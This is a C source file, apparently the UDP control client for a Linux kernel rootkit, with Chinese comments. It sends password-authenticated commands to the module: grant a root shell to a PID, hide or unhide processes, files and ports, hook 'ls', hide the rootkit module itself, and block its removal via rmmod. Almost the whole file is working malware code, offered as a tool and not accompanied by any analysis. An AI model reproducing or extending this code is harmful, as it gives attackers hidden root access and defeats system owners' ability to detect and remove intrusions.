//socket udp 客户端
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <memory.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#include "config.h"

//打印命令格式
void print_help(char **argv)
{
    printf(
        "Usage: %s [OPTION]...\n"
        "\n"
        "Options:\n"
        "  --root-shell=PID        Set the specified PID root shell.\n"
        "  --hide-pid=PID          Hides the specified PID.\n"
        "  --unhide-pid=PID        Unhides the specified PID.\n"
        "  --hide-file=FILEPATH    Hides the specified FILE globally.\n"
        "  --unhide-file=FILEPATH  Unhides the specified FILE.\n"
        "  --hide-port=PORTNUM     Hides the specified PORTNUM globally.\n"
        "  --unhide-port=PORTNUM   Unhides the specified PORTNUM.\n"
        "  --lshook                Hooks the command \"ls\".\n"
        "  --cleanlshook           Cleans the hook of the command \"ls\".\n"
        "  --hide                  Hides the rootkit LKM.\n"
        "  --unhide                Unhides the rootkit LKM.\n"
        "  --help                  Print this help message.\n"
        "  --protect               Protects the rootkit from rmmod.\n"
        "  --unprotect             Disables the rmmod protection.\n"
        "  --password              Set the PASSWORD.it used with the options above.\n\n",
        argv[0]);
}

//处理传入的参数
void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
                                   int *unhide_pid, char **pid, int *hide_file,
                                   int *unhide_file, char **file, int *hide_port,
                                   int *unhide_port, char **port, int *lshook, int *cleanlshook,
                                   int *hide, int *unhide, int *protect, int *unprotect,
                                   int *set_password, char **password)
{
    if (argc < 2)
    {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        print_help(argv);
        exit(1);
    }

    int option_index = 0;

    static struct option long_options[] = {
        {"root-shell", required_argument, 0, 'a'},
        {"hide-pid", required_argument, 0, 'b'},
        {"unhide-pid", required_argument, 0, 'c'},
        {"hide-file", required_argument, 0, 'd'},
        {"unhide-file", required_argument, 0, 'e'},
        {"hide-port", required_argument, 0, 'f'},
        {"unhide-port", required_argument, 0, 'g'},
        {"lshook", no_argument, 0, 'q'},
        {"cleanlshook", no_argument, 0, 'r'},
        {"help", no_argument, 0, 'h'},
        {"hide", no_argument, 0, 'i'},
        {"unhide", no_argument, 0, 'j'},
        {"protect", no_argument, 0, 'k'},
        {"unprotect", no_argument, 0, 'l'},
        {"password", required_argument, 0, 'p'},
        {NULL, 0, 0, 0}};

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL;
    *hide_file = 0;
    *unhide_file = 0;
    *file = NULL;
    *hide_port = 0;
    *unhide_port = 0;
    *port = NULL;
    *hide = 0;
    *unhide = 0;
    *protect = 0;
    *unprotect = 0;
    *password = NULL;
    *set_password = 0;
    *lshook = 0;
    *cleanlshook = 0;

    int opt;

    while ((opt = getopt_long(argc, argv, ":", long_options, &option_index)) != -1)
    {
        switch (opt)
        {
        case 'a':
            *root = 1;
            *pid = optarg;
            break;

        case 'b':
            *hide_pid = 1;
            *pid = optarg;
            break;

        case 'c':
            *unhide_pid = 1;
            *pid = optarg;
            break;

        case 'd':
            *hide_file = 1;
            *file = optarg;
            break;

        case 'e':
            *unhide_file = 1;
            *file = optarg;
            break;

        case 'f':
            *hide_port = 1;
            *port = optarg;
            break;

        case 'g':
            *unhide_port = 1;
            *port = optarg;
            break;

        case 'h':
            print_help(argv);
            exit(0);

        case 'i':
            *hide = 1;
            break;
        case 'j':
            *unhide = 1;
            break;

        case 'k':
            *protect = 1;
            break;

        case 'l':
            *unprotect = 1;
            break;

        case 'p':
            *set_password = 1;
            *password = optarg;
            break;

        case 'q':
            *lshook = 1;
            break;

        case 'r':
            *cleanlshook = 1;
            break;

        case '?':
            fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
            print_help(argv);
            exit(1);

        case ':':
            fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
            print_help(argv);
            exit(1);
        }
    }

    int num = *root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide_port + *unhide_port + *hide + *unhide + *protect + *unprotect + *lshook + *cleanlshook;

    if (num != 1)
    {
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        print_help(argv);
        exit(1);
    }
}

//向指定缓冲区追加内容
void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int main(int argc, char **argv)
{
    //命令和参数
    int root;
    int hide_pid;
    int unhide_pid;
    char *pid;
    int hide_file;
    int unhide_file;
    char *file;
    int hide_port;
    int unhide_port;
    char *port;
    int lshook;
    int cleanlshook;
    int hide;
    int unhide;
    int protect;
    int unprotect;
    int set_password;
    char *password;
    //发送和接受缓冲区
    //unsigned char send_buf[UDP_BUFF];
    //unsigned char recv_buf[UDP_BUFF];

    size_t buf_size = UDP_BUFF;
    char *send_buf = malloc(buf_size);
    send_buf[buf_size - 1] = 0;
    char *send_buf_ptr = send_buf;
    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid, &hide_file,
                                  &unhide_file, &file, &hide_port, &unhide_port, &port,
                                  &lshook, &cleanlshook, &hide, &unhide, &protect,
                                  &unprotect, &set_password, &password);
    printf("client:get command\n");

    //填充发送缓冲区
    if (set_password)
    { //默认密码是正确的不用设置，如果设置了密码这个正确的就没用了
        write_buffer(&send_buf_ptr, password, strlen(password));
    }
    else
    {
        write_buffer(&send_buf_ptr, CFG_PASS, strlen(CFG_PASS));
    }
    if (root)
    {
        write_buffer(&send_buf_ptr, "_" CFG_ROOT "_", strlen(CFG_ROOT) + 2);
        write_buffer(&send_buf_ptr, pid, strlen(pid));
    }
    else if (hide_pid)
    {
        write_buffer(&send_buf_ptr, "_" CFG_HIDE_PID "_", strlen(CFG_HIDE_PID) + 2);
        write_buffer(&send_buf_ptr, pid, strlen(pid));
    }
    else if (unhide_pid)
    {
        write_buffer(&send_buf_ptr, "_" CFG_UNHIDE_PID "_", strlen(CFG_UNHIDE_PID) + 2);
        write_buffer(&send_buf_ptr,  pid, strlen(pid));
    }
    else if (hide_file)
    {
        write_buffer(&send_buf_ptr, "_" CFG_HIDE_FILE "_", strlen(CFG_HIDE_FILE) + 2);
        write_buffer(&send_buf_ptr, file, strlen(file));
    }
    else if (unhide_file)
    {
        write_buffer(&send_buf_ptr, "_" CFG_UNHIDE_FILE "_", strlen(CFG_UNHIDE_FILE) + 2);
        write_buffer(&send_buf_ptr, file, strlen(file));
    }
    else if (hide_port)
    {
        write_buffer(&send_buf_ptr, "_" CFG_HIDE_PORT "_", strlen(CFG_HIDE_PORT) + 2);
        write_buffer(&send_buf_ptr, port, strlen(port));
    }
    else if (unhide_port)
    {
        write_buffer(&send_buf_ptr, "_" CFG_UNHIDE_PORT "_", strlen(CFG_UNHIDE_PORT) + 2);
        write_buffer(&send_buf_ptr,  port, strlen(port));
    }
    else if (lshook)
    {
        write_buffer(&send_buf_ptr, "_" CFG_LSHOOK, strlen(CFG_LSHOOK) + 1);
    }
    else if (cleanlshook)
    {
        write_buffer(&send_buf_ptr, "_" CFG_CLEANLSHOOK, strlen(CFG_CLEANLSHOOK) + 1);
    }
    else if (hide)
    {
        write_buffer(&send_buf_ptr, "_" CFG_HIDE, strlen(CFG_HIDE) + 1);
    }
    else if (unhide)
    {
        write_buffer(&send_buf_ptr, "_" CFG_UNHIDE, strlen(CFG_UNHIDE) + 1);
    }
    else if (protect)
    {
        write_buffer(&send_buf_ptr, "_" CFG_PROTECT, strlen(CFG_PROTECT) + 1);
    }
    else if (unprotect)
    {
        write_buffer(&send_buf_ptr, "_" CFG_UNPROTECT, strlen(CFG_UNPROTECT) + 1);
    }
    //创建socket对象
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0)
    {
        printf("client:socket create error\n");
        exit(1);
    }
    //创建网络通信对象
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(UDP_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    printf("client:socket created\n");

    // printf("client:send %s\n", send_buf);

    sendto(sockfd, send_buf, UDP_BUFF, 0, (struct sockaddr *)&addr, sizeof(addr));

    printf("client:send done\n");
    /*********************接收服务器返回的信息***************************************
    socklen_t len=sizeof(addr);
    recvfrom(sockfd,&recv_buf,sizeof(recv_buf),0,(struct sockaddr*)&addr,&len);
    printf("client:messege from server:%s\n",recv_buf);
    ********************************************************************************/

    close(sockfd);
}
